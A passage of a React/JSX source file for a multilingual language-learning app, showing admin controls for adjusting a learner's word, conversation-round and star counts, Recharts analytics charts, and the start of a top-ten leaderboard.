                                  >
                                    {activeItem.wordsCompleted} / {activeItem.wordsTotal} Words
                                  </span>
                                </div>

                                {/* Primary [-1] [Words Readout] [+1] Bar */}
                                <div
                                  className={`p-2.5 rounded-xl border flex items-center justify-between gap-2 ${
                                    isDark
                                      ? 'bg-slate-950 border-slate-800'
                                      : 'bg-slate-50 border-slate-200'
                                  }`}
                                >
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          wordsCompleted: Math.max(
                                            0,
                                            activeItem.wordsCompleted - 1
                                          ),
                                        },
                                        `🍎 ${activeItem.displayName}: ${Math.max(0, activeItem.wordsCompleted - 1)}/${activeItem.wordsTotal} Words`
                                      )
                                    }
                                    className="px-3 py-2 rounded-lg bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 text-rose-500 text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <Minus className="w-3.5 h-3.5" />
                                    <span>-1 Word</span>
                                  </button>

                                  <div className="text-center">
                                    <div
                                      className="font-mono font-bold text-2xl text-emerald-500 leading-none"
                                      style={{
                                        fontVariantNumeric: 'tabular-nums',
                                      }}
                                    >
                                      {activeItem.wordsCompleted}
                                    </div>
                                    <div className="text-[10px] text-slate-500 dark:text-slate-400 mt-1">
                                      of {activeItem.wordsTotal} Words
                                    </div>
                                  </div>

                                  <button
                                    type="button"
                                    onClick={() => {
                                      const nextW = Math.min(
                                        activeItem.wordsTotal,
                                        activeItem.wordsCompleted + 1
                                      );
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { wordsCompleted: nextW },
                                        `🍎 ${activeItem.displayName}: ${nextW}/${activeItem.wordsTotal} Words`
                                      );
                                    }}
                                    className="px-3 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <Plus className="w-3.5 h-3.5" />
                                    <span>+1 Word</span>
                                  </button>
                                </div>

                                {/* Quick Preset Buttons for Words + Complete All Words */}
                                <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5">
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { wordsCompleted: 0 },
                                        `🍎 ${activeItem.displayName}: Words Reset to 0`
                                      )
                                    }
                                    className="py-1.5 px-2 rounded-lg border border-rose-500/30 text-rose-500 hover:bg-rose-500/10 text-[11px] font-mono font-bold cursor-pointer"
                                  >
                                    Reset 0
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      const nextW = Math.min(
                                        activeItem.wordsTotal,
                                        activeItem.wordsCompleted + 5
                                      );
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { wordsCompleted: nextW },
                                        `🍎 ${activeItem.displayName}: ${nextW}/${activeItem.wordsTotal} Words`
                                      );
                                    }}
                                    className={`py-1.5 px-2 rounded-lg border text-[11px] font-mono font-bold cursor-pointer ${
                                      isDark
                                        ? 'border-slate-800 bg-slate-950 text-emerald-400 hover:border-emerald-500/50'
                                        : 'border-slate-200 bg-slate-50 text-emerald-700 hover:border-emerald-500'
                                    }`}
                                  >
                                    +5 Words
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      const nextW = Math.min(
                                        activeItem.wordsTotal,
                                        activeItem.wordsCompleted + 10
                                      );
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { wordsCompleted: nextW },
                                        `🍎 ${activeItem.displayName}: ${nextW}/${activeItem.wordsTotal} Words`
                                      );
                                    }}
                                    className={`py-1.5 px-2 rounded-lg border text-[11px] font-mono font-bold cursor-pointer ${
                                      isDark
                                        ? 'border-slate-800 bg-slate-950 text-emerald-400 hover:border-emerald-500/50'
                                        : 'border-slate-200 bg-slate-50 text-emerald-700 hover:border-emerald-500'
                                    }`}
                                  >
                                    +10 Words
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          wordsCompleted: activeItem.wordsTotal,
                                        },
                                        `✅ ${activeItem.displayName}: All ${activeItem.wordsTotal} Words Completed!`
                                      )
                                    }
                                    className="py-1.5 px-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-[11px] font-extrabold cursor-pointer"
                                  >
                                    ✅ All {activeItem.wordsTotal}
                                  </button>
                                </div>

                                {/* Direct Numeric Input for Words */}
                                <div className="flex items-end gap-2 pt-1">
                                  <div className="flex-1">
                                    <label className="block text-[10px] text-slate-500 dark:text-slate-400 mb-1">
                                      Set Exact Words Completed (0 – {activeItem.wordsTotal})
                                    </label>
                                    <input
                                      type="number"
                                      min={0}
                                      max={activeItem.wordsTotal}
                                      value={profileCustomWords}
                                      onChange={(e) =>
                                        setProfileCustomWords(
                                          Math.max(
                                            0,
                                            Math.min(
                                              activeItem.wordsTotal,
                                              Number(e.target.value) || 0
                                            )
                                          )
                                        )
                                      }
                                      className={`w-full px-2.5 py-1.5 rounded-lg border text-xs font-mono font-bold ${
                                        isDark
                                          ? 'bg-slate-950 border-slate-800 text-white'
                                          : 'bg-slate-50 border-slate-300 text-slate-900'
                                      }`}
                                    />
                                  </div>
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          wordsCompleted: profileCustomWords,
                                        },
                                        `🍎 ${activeItem.displayName}: ${profileCustomWords}/${activeItem.wordsTotal} Words`
                                      )
                                    }
                                    className="px-3.5 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-bold cursor-pointer whitespace-nowrap"
                                  >
                                    {mt.applyBtn}
                                  </button>
                                </div>
                              </div>

                              {/* Control Block 4: Conversation Rounds Progress (بات چیت کے راؤنڈز بڑھائیں / مکمل کریں) */}
                              <div className="p-4 space-y-3">
                                <div className="flex items-center justify-between">
                                  <span className="text-xs font-bold uppercase tracking-wider text-purple-400 flex items-center gap-1.5">
                                    <span>💬 Conversation Rounds (بات چیت راؤنڈز)</span>
                                  </span>
                                  <span
                                    className="text-xs font-mono font-extrabold text-purple-400"
                                    style={{
                                      fontVariantNumeric: 'tabular-nums',
                                    }}
                                  >
                                    {activeItem.conversationsCompleted} / {activeItem.conversationsTotal} Rounds
                                  </span>
                                </div>

                                {/* Primary [-1 Round] [Rounds Readout] [+1 Round] Bar */}
                                <div
                                  className={`p-2.5 rounded-xl border flex items-center justify-between gap-2 ${
                                    isDark
                                      ? 'bg-slate-950 border-slate-800'
                                      : 'bg-slate-50 border-slate-200'
                                  }`}
                                >
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          conversationsCompleted: Math.max(
                                            0,
                                            activeItem.conversationsCompleted - 1
                                          ),
                                        },
                                        `💬 ${activeItem.displayName}: ${Math.max(0, activeItem.conversationsCompleted - 1)}/${activeItem.conversationsTotal} Rounds`
                                      )
                                    }
                                    className="px-3 py-2 rounded-lg bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 text-rose-500 text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <Minus className="w-3.5 h-3.5" />
                                    <span>-1 Round</span>
                                  </button>

                                  <div className="text-center">
                                    <div
                                      className="font-mono font-bold text-2xl text-purple-400 leading-none"
                                      style={{
                                        fontVariantNumeric: 'tabular-nums',
                                      }}
                                    >
                                      {activeItem.conversationsCompleted}
                                    </div>
                                    <div className="text-[10px] text-slate-500 dark:text-slate-400 mt-1">
                                      of {activeItem.conversationsTotal} Rounds
                                    </div>
                                  </div>

                                  <button
                                    type="button"
                                    onClick={() => {
                                      const nextC = Math.min(
                                        activeItem.conversationsTotal,
                                        activeItem.conversationsCompleted + 1
                                      );
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { conversationsCompleted: nextC },
                                        `💬 ${activeItem.displayName}: ${nextC}/${activeItem.conversationsTotal} Rounds`
                                      );
                                    }}
                                    className="px-3 py-2 rounded-lg bg-purple-500 hover:bg-purple-400 text-white text-xs font-bold flex items-center gap-1 cursor-pointer whitespace-nowrap"
                                  >
                                    <Plus className="w-3.5 h-3.5" />
                                    <span>+1 Round</span>
                                  </button>
                                </div>

                                {/* Quick Preset Buttons for Conversation Rounds + Complete All */}
                                <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5">
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { conversationsCompleted: 0 },
                                        `💬 ${activeItem.displayName}: Conversation Rounds Reset to 0`
                                      )
                                    }
                                    className="py-1.5 px-2 rounded-lg border border-rose-500/30 text-rose-500 hover:bg-rose-500/10 text-[11px] font-mono font-bold cursor-pointer"
                                  >
                                    Reset 0
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      const nextC = Math.min(
                                        activeItem.conversationsTotal,
                                        activeItem.conversationsCompleted + 5
                                      );
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { conversationsCompleted: nextC },
                                        `💬 ${activeItem.displayName}: ${nextC}/${activeItem.conversationsTotal} Rounds`
                                      );
                                    }}
                                    className={`py-1.5 px-2 rounded-lg border text-[11px] font-mono font-bold cursor-pointer ${
                                      isDark
                                        ? 'border-slate-800 bg-slate-950 text-purple-300 hover:border-purple-500/50'
                                        : 'border-slate-200 bg-slate-50 text-purple-700 hover:border-purple-500'
                                    }`}
                                  >
                                    +5 Rounds
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      const nextC = Math.min(
                                        activeItem.conversationsTotal,
                                        activeItem.conversationsCompleted + 15
                                      );
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { conversationsCompleted: nextC },
                                        `💬 ${activeItem.displayName}: ${nextC}/${activeItem.conversationsTotal} Rounds`
                                      );
                                    }}
                                    className={`py-1.5 px-2 rounded-lg border text-[11px] font-mono font-bold cursor-pointer ${
                                      isDark
                                        ? 'border-slate-800 bg-slate-950 text-purple-300 hover:border-purple-500/50'
                                        : 'border-slate-200 bg-slate-50 text-purple-700 hover:border-purple-500'
                                    }`}
                                  >
                                    +15 Rounds
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          conversationsCompleted:
                                            activeItem.conversationsTotal,
                                        },
                                        `✅ ${activeItem.displayName}: All ${activeItem.conversationsTotal} Conversation Rounds Completed!`
                                      )
                                    }
                                    className="py-1.5 px-2 rounded-lg bg-purple-500 hover:bg-purple-400 text-white text-[11px] font-extrabold cursor-pointer"
                                  >
                                    ✅ All {activeItem.conversationsTotal}
                                  </button>
                                </div>

                                {/* Direct Numeric Input for Conversation Rounds */}
                                <div className="flex items-end gap-2 pt-1">
                                  <div className="flex-1">
                                    <label className="block text-[10px] text-slate-500 dark:text-slate-400 mb-1">
                                      Set Exact Conversation Rounds (0 – {activeItem.conversationsTotal})
                                    </label>
                                    <input
                                      type="number"
                                      min={0}
                                      max={activeItem.conversationsTotal}
                                      value={profileCustomConversations}
                                      onChange={(e) =>
                                        setProfileCustomConversations(
                                          Math.max(
                                            0,
                                            Math.min(
                                              activeItem.conversationsTotal,
                                              Number(e.target.value) || 0
                                            )
                                          )
                                        )
                                      }
                                      className={`w-full px-2.5 py-1.5 rounded-lg border text-xs font-mono font-bold ${
                                        isDark
                                          ? 'bg-slate-950 border-slate-800 text-white'
                                          : 'bg-slate-50 border-slate-300 text-slate-900'
                                      }`}
                                    />
                                  </div>
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          conversationsCompleted:
                                            profileCustomConversations,
                                        },
                                        `💬 ${activeItem.displayName}: ${profileCustomConversations}/${activeItem.conversationsTotal} Rounds`
                                      )
                                    }
                                    className="px-3.5 py-1.5 rounded-lg bg-purple-500 hover:bg-purple-400 text-white text-xs font-bold cursor-pointer whitespace-nowrap"
                                  >
                                    {mt.applyBtn}
                                  </button>
                                </div>
                              </div>

                              {/* Control Block 5: Stars Adjustment */}
                              <div className="p-4 space-y-2.5">
                                <div className="flex items-center justify-between">
                                  <span className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400">
                                    {mt.starsRewardsTitle}
                                  </span>
                                  <span
                                    className="text-xs font-mono font-bold text-amber-500"
                                    style={{
                                      fontVariantNumeric: 'tabular-nums',
                                    }}
                                  >
                                    {mt.starsCountLabel(activeItem.stars)}
                                  </span>
                                </div>

                                <div className="grid grid-cols-3 gap-2">
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        {
                                          stars: Math.max(
                                            0,
                                            activeItem.stars - 10
                                          ),
                                        },
                                        `${activeItem.displayName}: -10 ⭐`
                                      )
                                    }
                                    className="py-1.5 px-2.5 rounded-lg border border-rose-500/30 text-rose-500 hover:bg-rose-500/10 text-xs font-mono font-bold cursor-pointer"
                                  >
                                    -10 ⭐
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { stars: activeItem.stars + 10 },
                                        `${activeItem.displayName}: +10 ⭐`
                                      )
                                    }
                                    className={`py-1.5 px-2.5 rounded-lg border text-xs font-mono font-bold cursor-pointer ${
                                      isDark
                                        ? 'bg-slate-950 border-slate-800 text-amber-400 hover:border-amber-500/50'
                                        : 'bg-slate-50 border-slate-200 text-amber-600 hover:border-amber-500'
                                    }`}
                                  >
                                    +10 ⭐
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() =>
                                      handleAdminBoostLearner(
                                        activeItem,
                                        { stars: activeItem.stars + 50 },
                                        `${activeItem.displayName}: +50 ⭐`
                                      )
                                    }
                                    className="py-1.5 px-2.5 rounded-lg bg-amber-500 hover:bg-amber-400 text-slate-950 text-xs font-mono font-bold cursor-pointer"
                                  >
                                    +50 ⭐
                                  </button>
                                </div>

                                {/* Two Custom Input Boxes: Box 1 (+ Add Stars) & Box 2 (- Minus Stars) */}
                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 pt-2">
                                  {/* Box 1: Custom Add Stars */}
                                  <div
                                    className={`p-2.5 rounded-xl border space-y-1.5 ${
                                      isDark
                                        ? 'bg-emerald-950/30 border-emerald-500/40'
                                        : 'bg-emerald-50/70 border-emerald-200'
                                    }`}
                                  >
                                    <label className="block text-[10px] font-extrabold text-emerald-500 uppercase tracking-wider">
                                      ➕ Add Stars (+ स्टार्स / + سٹارز)
                                    </label>
                                    <div className="flex items-center gap-1.5">
                                      <input
                                        type="number"
                                        min={1}
                                        max={100000}
                                        value={customStarsAddInput}
                                        onChange={(e) =>
                                          setCustomStarsAddInput(e.target.value)
                                        }
                                        onKeyDown={(e) => {
                                          if (e.key === 'Enter') {
                                            const addVal = Math.max(
                                              0,
                                              Math.floor(
                                                Number(customStarsAddInput) || 0
                                              )
                                            );
                                            if (addVal <= 0) return;
                                            const nextStars = Math.min(
                                              100000,
                                              Number(activeItem.stars || 0) +
                                                addVal
                                            );
                                            handleAdminBoostLearner(
                                              activeItem,
                                              { stars: nextStars },
                                              `${activeItem.displayName}: +${addVal} ⭐ (${nextStars} ⭐)`
                                            );
                                          }
                                        }}
                                        placeholder="+ Stars"
                                        className={`w-full min-w-0 px-2.5 py-1.5 rounded-lg border text-xs font-mono font-bold outline-none ${
                                          isDark
                                            ? 'bg-slate-950 border-slate-800 text-emerald-400 focus:border-emerald-400'
                                            : 'bg-white border-slate-300 text-slate-900 focus:border-emerald-500'
                                        }`}
                                      />
                                      <button
                                        type="button"
                                        onClick={() => {
                                          const addVal = Math.max(
                                            0,
                                            Math.floor(
                                              Number(customStarsAddInput) || 0
                                            )
                                          );
                                          if (addVal <= 0) return;
                                          const nextStars = Math.min(
                                            100000,
                                            Number(activeItem.stars || 0) +
                                              addVal
                                          );
                                          handleAdminBoostLearner(
                                            activeItem,
                                            { stars: nextStars },
                                            `${activeItem.displayName}: +${addVal} ⭐ (${nextStars} ⭐)`
                                          );
                                        }}
                                        className="px-3 py-1.5 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-slate-950 text-xs font-extrabold cursor-pointer whitespace-nowrap shrink-0"
                                      >
                                        + Add ⭐
                                      </button>
                                    </div>
                                  </div>

                                  {/* Box 2: Custom Minus Stars */}
                                  <div
                                    className={`p-2.5 rounded-xl border space-y-1.5 ${
                                      isDark
                                        ? 'bg-rose-950/30 border-rose-500/40'
                                        : 'bg-rose-50/70 border-rose-200'
                                    }`}
                                  >
                                    <label className="block text-[10px] font-extrabold text-rose-500 uppercase tracking-wider">
                                      ➖ Minus Stars (- स्टार्स / - سٹارز)
                                    </label>
                                    <div className="flex items-center gap-1.5">
                                      <input
                                        type="number"
                                        min={1}
                                        max={100000}
                                        value={customStarsMinusInput}
                                        onChange={(e) =>
                                          setCustomStarsMinusInput(
                                            e.target.value
                                          )
                                        }
                                        onKeyDown={(e) => {
                                          if (e.key === 'Enter') {
                                            const subVal = Math.max(
                                              0,
                                              Math.floor(
                                                Number(customStarsMinusInput) ||
                                                  0
                                              )
                                            );
                                            if (subVal <= 0) return;
                                            const nextStars = Math.max(
                                              0,
                                              Number(activeItem.stars || 0) -
                                                subVal
                                            );
                                            handleAdminBoostLearner(
                                              activeItem,
                                              { stars: nextStars },
                                              `${activeItem.displayName}: -${subVal} ⭐ (${nextStars} ⭐)`
                                            );
                                          }
                                        }}
                                        placeholder="- Stars"
                                        className={`w-full min-w-0 px-2.5 py-1.5 rounded-lg border text-xs font-mono font-bold outline-none ${
                                          isDark
                                            ? 'bg-slate-950 border-slate-800 text-rose-400 focus:border-rose-400'
                                            : 'bg-white border-slate-300 text-slate-900 focus:border-rose-500'
                                        }`}
                                      />
                                      <button
                                        type="button"
                                        onClick={() => {
                                          const subVal = Math.max(
                                            0,
                                            Math.floor(
                                              Number(customStarsMinusInput) || 0
                                            )
                                          );
                                          if (subVal <= 0) return;
                                          const nextStars = Math.max(
                                            0,
                                            Number(activeItem.stars || 0) -
                                              subVal
                                          );
                                          handleAdminBoostLearner(
                                            activeItem,
                                            { stars: nextStars },
                                            `${activeItem.displayName}: -${subVal} ⭐ (${nextStars} ⭐)`
                                          );
                                        }}
                                        className="px-3 py-1.5 rounded-lg bg-rose-500 hover:bg-rose-400 text-white text-xs font-extrabold cursor-pointer whitespace-nowrap shrink-0"
                                      >
                                        - Minus ⭐
                                      </button>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          );
                        })()
                      ) : (
                        <div className="p-8 text-center text-xs text-slate-500">
                          {mt.selectStudentFromListHint}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* ADMIN-ONLY ANALYTICS: RECHARTS LEARNER PROGRESS & FIRESTORE ANALYTICS (Strictly inside Admin Panel) */}
              {(activeTab === 'admin' || activeTab === 'analytics') &&
                canOpenAdminPanel && (
                  <div className="space-y-5 pt-6 mt-6 border-t-2 border-slate-200 dark:border-slate-800">
                    <div className="flex items-center justify-between gap-2">
                      <h4 className="font-display font-extrabold text-base sm:text-lg flex items-center gap-2">
                        <BarChart3 className="w-5 h-5 text-purple-500" />
                        <span>
                          📊 {mt.tabAnalytics} — Admin Platform Analytics & Live Charts
                        </span>
                      </h4>
                      <span className="px-2.5 py-1 rounded-full text-[11px] font-extrabold bg-purple-500/15 text-purple-500 border border-purple-500/30">
                        🛡️ Admin Only
                      </span>
                    </div>
                    {/* Top KPI Summary Cards */}
                    <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
                    <div
                      className={`p-4 rounded-2xl border-2 flex items-center gap-3 ${
                        isDark
                          ? 'bg-slate-800/85 border-slate-700'
                          : 'bg-purple-50/90 border-purple-200'
                      }`}
                    >
                      <div className="w-11 h-11 rounded-2xl bg-gradient-to-b from-purple-400 to-purple-600 text-white flex items-center justify-center shadow-sm shrink-0">
                        <Users className="w-5 h-5" />
                      </div>
                      <div>
                        <div className="text-[11px] font-bold opacity-75">
                          {mt.kpiActiveLearners}
                        </div>
                        <div className="font-display font-extrabold text-xl sm:text-2xl">
                          {analyticsSummary.totalUsers}
                        </div>
                      </div>
                    </div>

                    <div
                      className={`p-4 rounded-2xl border-2 flex items-center gap-3 ${
                        isDark
                          ? 'bg-slate-800/85 border-slate-700'
                          : 'bg-amber-50/90 border-amber-200'
                      }`}
                    >
                      <div className="w-11 h-11 rounded-2xl bg-gradient-to-b from-amber-400 to-orange-500 text-white flex items-center justify-center shadow-sm shrink-0">
                        <Star className="w-5 h-5 fill-white" />
                      </div>
                      <div>
                        <div className="text-[11px] font-bold opacity-75">
                          {mt.kpiTotalStarsCard}
                        </div>
                        <div className="font-display font-extrabold text-xl sm:text-2xl">
                          {analyticsSummary.totalStarsAll}
                        </div>
                      </div>
                    </div>

                    <div
                      className={`p-4 rounded-2xl border-2 flex items-center gap-3 ${
                        isDark
                          ? 'bg-slate-800/85 border-slate-700'
                          : 'bg-emerald-50/90 border-emerald-200'
                      }`}
                    >
                      <div className="w-11 h-11 rounded-2xl bg-gradient-to-b from-emerald-400 to-teal-600 text-white flex items-center justify-center shadow-sm shrink-0">
                        <TrendingUp className="w-5 h-5" />
                      </div>
                      <div>
                        <div className="text-[11px] font-bold opacity-75">
                          {mt.kpiPoppedBalloons}
                        </div>
                        <div className="font-display font-extrabold text-xl sm:text-2xl">
                          {analyticsSummary.totalPoppedAll}
                        </div>
                      </div>
                    </div>

                    <div
                      className={`p-4 rounded-2xl border-2 flex items-center gap-3 ${
                        isDark
                          ? 'bg-slate-800/85 border-slate-700'
                          : 'bg-rose-50/90 border-rose-200'
                      }`}
                    >
                      <div className="w-11 h-11 rounded-2xl bg-gradient-to-b from-rose-400 to-pink-600 text-white flex items-center justify-center shadow-sm shrink-0">
                        <Flame className="w-5 h-5 fill-amber-200" />
                      </div>
                      <div>
                        <div className="text-[11px] font-bold opacity-75">
                          {mt.kpiAvgStreakCard}
                        </div>
                        <div className="font-display font-extrabold text-xl sm:text-2xl">
                          {analyticsSummary.avgStreak}d
                        </div>
                      </div>
                    </div>
                  </div>

                  {loadingLearners && (
                    <div className="text-xs font-bold text-center opacity-75">
                      {mt.loadingAnalyticsText}
                    </div>
                  )}

                  {/* Charts Grid: AreaChart (Stars & Active Users Over Time) + BarChart (Stage Progress Breakdown) */}
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                    {/* Chart 1: Total Stars & Active Learners Over Time */}
                    <div
                      className={`p-4 sm:p-5 rounded-3xl border-2 ${
                        isDark
                          ? 'bg-slate-800/80 border-slate-700'
                          : 'bg-slate-50/90 border-slate-200'
                      }`}
                    >
                      <div className="flex items-center justify-between gap-2 mb-3">
                        <div>
                          <h5 className="font-display font-extrabold text-sm sm:text-base flex items-center gap-1.5">
                            <TrendingUp className="w-4 h-4 text-amber-400" />
                            <span>{mt.chart1Title}</span>
                          </h5>
                          <p className="text-xs opacity-75 mt-0.5">
                            {mt.chart1Subtitle}
                          </p>
                        </div>
                      </div>

                      <div dir="ltr" className="w-full h-64">
                        <ResponsiveContainer width="100%" height="100%">
                          <AreaChart
                            data={timeSeriesChartData}
                            margin={{ top: 10, right: 12, left: -12, bottom: 0 }}
                          >
                            <defs>
                              <linearGradient id="colorStars" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#F59E0B" stopOpacity={0.65} />
                                <stop offset="95%" stopColor="#F59E0B" stopOpacity={0.05} />
                              </linearGradient>
                              <linearGradient id="colorUsers" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#38BDF8" stopOpacity={0.65} />
                                <stop offset="95%" stopColor="#38BDF8" stopOpacity={0.05} />
                              </linearGradient>
                            </defs>
                            <CartesianGrid
                              strokeDasharray="3 3"
                              stroke={isDark ? '#334155' : '#E2E8F0'}
                            />
                            <XAxis
                              dataKey="label"
                              stroke={isDark ? '#94A3B8' : '#64748B'}
                              fontSize={11}
                            />
                            <YAxis
                              stroke={isDark ? '#94A3B8' : '#64748B'}
                              fontSize={11}
                              allowDecimals={false}
                            />
                            <Tooltip
                              contentStyle={{
                                backgroundColor: isDark ? '#0F172A' : '#FFFFFF',
                                borderColor: isDark ? '#334155' : '#CBD5E1',
                                borderRadius: '12px',
                                fontSize: '12px',
                                fontWeight: 700,
                              }}
                            />
                            <Legend wrapperStyle={{ fontSize: '12px', fontWeight: 700 }} />
                            <Area
                              type="monotone"
                              dataKey="totalStars"
                              name={mt.chart1SeriesStars}
                              stroke="#F59E0B"
                              strokeWidth={2.5}
                              fillOpacity={1}
                              fill="url(#colorStars)"
                            />
                            <Area
                              type="monotone"
                              dataKey="activeUsers"
                              name={mt.chart1SeriesUsers}
                              stroke="#38BDF8"
                              strokeWidth={2.5}
                              fillOpacity={1}
                              fill="url(#colorUsers)"
                            />
                          </AreaChart>
                        </ResponsiveContainer>
                      </div>
                    </div>

                    {/* Chart 2: Learner Stage Completion Breakdown */}
                    <div
                      className={`p-4 sm:p-5 rounded-3xl border-2 ${
                        isDark
                          ? 'bg-slate-800/80 border-slate-700'
                          : 'bg-slate-50/90 border-slate-200'
                      }`}
                    >
                      <div className="flex items-center justify-between gap-2 mb-3">
                        <div>
                          <h5 className="font-display font-extrabold text-sm sm:text-base flex items-center gap-1.5">
                            <BarChart3 className="w-4 h-4 text-purple-400" />
                            <span>{mt.chart2Title}</span>
                          </h5>
                          <p className="text-xs opacity-75 mt-0.5">
                            {mt.chart2Subtitle}
                          </p>
                        </div>
                      </div>

                      <div dir="ltr" className="w-full h-64">
                        <ResponsiveContainer width="100%" height="100%">
                          <BarChart
                            data={learnerStageBarData}
                            margin={{ top: 10, right: 12, left: -12, bottom: 0 }}
                          >
                            <CartesianGrid
                              strokeDasharray="3 3"
                              stroke={isDark ? '#334155' : '#E2E8F0'}
                            />
                            <XAxis
                              dataKey="name"
                              stroke={isDark ? '#94A3B8' : '#64748B'}
                              fontSize={11}
                            />
                            <YAxis
                              stroke={isDark ? '#94A3B8' : '#64748B'}
                              fontSize={11}
                              allowDecimals={false}
                            />
                            <Tooltip
                              contentStyle={{
                                backgroundColor: isDark ? '#0F172A' : '#FFFFFF',
                                borderColor: isDark ? '#334155' : '#CBD5E1',
                                borderRadius: '12px',
                                fontSize: '12px',
                                fontWeight: 700,
                              }}
                            />
                            <Legend wrapperStyle={{ fontSize: '12px', fontWeight: 700 }} />
                            <Bar
                              dataKey="words"
                              name={mt.chart2SeriesWords}
                              fill="#FBBF24"
                              radius={[6, 6, 0, 0]}
                            />
                            <Bar
                              dataKey="conversations"
                              name={mt.chart2SeriesConversation}
                              fill="#34D399"
                              radius={[6, 6, 0, 0]}
                            />
                          </BarChart>
                        </ResponsiveContainer>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* TAB 5: TOP 10 LEARNERS LEADERBOARD (Ranked by Stars Earned from Firestore) */}
              {activeTab === 'leaderboard' && (
                <div className="space-y-5">
                  {/* Leaderboard Banner */}
                  <div
                    className={`rounded-3xl p-4 sm:p-5 border-2 flex flex-col sm:flex-row sm:items-center justify-between gap-3 ${
                      isDark
                        ? 'bg-gradient-to-r from-amber-950/60 via-slate-800/90 to-orange-950/50 border-amber-500/40'
                        : 'bg-gradient-to-r from-amber-50 via-yellow-50/90 to-orange-50 border-amber-300'
                    }`}
                  >
                    <div className="flex items-center gap-3.5">
                      <div className="w-12 h-12 rounded-2xl bg-gradient-to-b from-amber-400 to-orange-500 text-slate-950 flex items-center justify-center shadow-[0_4px_0_#B45309] shrink-0">
                        <Trophy className="w-6 h-6" />
                      </div>
                      <div>
                        <h4 className="font-display font-extrabold text-base sm:text-lg flex flex-wrap items-center gap-2">
                          <span>{mt.leaderboardBannerTitle}</span>
                          <span className="text-[11px] px-2.5 py-0.5 rounded-full bg-amber-500 text-slate-950 font-extrabold">
                            {mt.leaderboardByStarsBadge}
                          </span>
                        </h4>
                        <p className="text-xs opacity-80 mt-0.5">
                          {mt.leaderboardBannerDesc}
                        </p>
                      </div>
                    </div>

                    <div className="flex items-center gap-2 shrink-0">
                      <div
                        className={`px-3.5 py-2 rounded-2xl border text-xs font-extrabold flex items-center gap-1.5 ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-700 text-amber-300'
                            : 'bg-white border-amber-300 text-amber-700 shadow-xs'
                        }`}
                      >
                        <Star className="w-4 h-4 fill-amber-400 text-amber-400" />
                        <span>{mt.yourStarsLabel(stars)}</span>
                      </div>
                    </div>
                  </div>

                  {loadingLeaderboard && (
                    <div className="p-4 text-center text-xs sm:text-sm font-bold opacity-75">
                      {mt.loadingLeaderboardText}
                    </div>
                  )}

                  {/* Top 3 Podium Cards */}
                  {topTenLearners.length > 0 && (
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                      {topTenLearners.slice(0, 3).map((leader, idx) => {
                        const medal = idx === 0 ? '🥇' : idx === 1 ? '🥈' : '🥉';
                        const rankTitle =
                          idx === 0
                            ? mt.rank1Title
                            : idx === 1
                            ? mt.rank2Title
                            : mt.rank3Title;
                        const cardStyle =
                          idx === 0
                            ? isDark
                              ? 'bg-gradient-to-b from-amber-950/70 to-slate-800 border-amber-400'
                              : 'bg-gradient-to-b from-amber-100/90 to-yellow-50 border-amber-400 shadow-md'
                            : idx === 1
                            ? isDark
                              ? 'bg-slate-800/90 border-slate-400/60'
                              : 'bg-slate-50 border-slate-300'
                            : isDark
                            ? 'bg-orange-950/40 border-orange-500/50'
                            : 'bg-orange-50/70 border-orange-300';

                        return (
                          <div
                            key={`podium-${leader.uid}`}
                            className={`p-4 rounded-3xl border-2 flex flex-col justify-between gap-2.5 ${cardStyle}`}
                          >
                            <div className="flex items-center justify-between gap-2">
                              <span className="text-2xl sm:text-3xl">{medal}</span>
